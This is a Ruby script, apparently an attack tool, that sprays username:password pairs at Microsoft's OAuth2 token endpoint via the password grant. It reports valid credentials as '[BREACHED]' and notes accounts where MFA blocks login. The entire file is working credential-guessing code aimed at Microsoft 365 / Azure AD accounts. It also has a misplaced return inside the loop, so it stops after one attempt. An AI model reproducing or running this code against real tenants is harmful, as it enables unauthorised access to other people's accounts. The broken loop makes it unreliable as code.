['faraday','erb','json'].each(&method(:require))


def bruteforce(array_)
	success = []
	success.append("\nBruteforce Results\n")
	puts ("\nBruteforce Results\n")
	array_.each do |user_pass|
		sleep 1
		user,psword = user_pass.split(":",2)
		user = user.gsub("\n",'')
		resp = Faraday.post('https://login.microsoft.com/common/oauth2/token') do |req|
			req.body = "resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&client_info=1&scope=openid&username=#{ERB::Util.url_encode(user)}&password=#{ERB::Util.url_encode(psword)}&grant_type=password"
			req.headers['Accept'] = 'application/json'
			req.headers['Content-Type'] =  'application/x-www-form-urlencoded'
		end
		if resp.status === 200 then 
			data = "[BREACHED]\tUser:#{user}\t\t\tPassword: #{psword}"
			success.append(data)
			puts data
		elsif JSON.parse(resp.body)['error'] === "interaction_required" then 
			data = "[BREACHED]\tUser:#{user}\t\t\tPassword: #{psword}\t\t\tMFA Required"
			success.append(data)
			puts data
		end
		return success
	end
end